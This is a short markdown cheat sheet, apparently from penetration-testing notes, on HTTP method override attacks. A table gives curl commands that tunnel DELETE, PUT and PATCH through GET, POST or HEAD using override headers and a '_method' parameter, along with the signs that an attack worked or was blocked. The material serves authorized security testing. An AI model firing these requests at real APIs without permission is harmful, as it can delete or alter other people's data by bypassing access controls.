# METHOD OVERRIDE — EXECUTION

| Signal | Test | Confirm | Kill |
|--------|------|---------|------|
| `X-HTTP-Method-Override` | `curl -X GET -H "X-HTTP-Method-Override: DELETE" /api/user` | User deleted | Override ignored |
| `X-HTTP-Method` | `curl -X POST -H "X-HTTP-Method: PUT" /api/order` | Order updated | Normalized |
| `X-Method-Override` | `curl -X HEAD -H "X-Method-Override: PATCH" /api/profile` | Profile patched via HEAD | Sanitized |
| `_method` param | `curl -X POST "/api/note?_method=DELETE"` | Note deleted | Param filtered |

All method override attacks exploit: frontend restricts method, but override bypasses
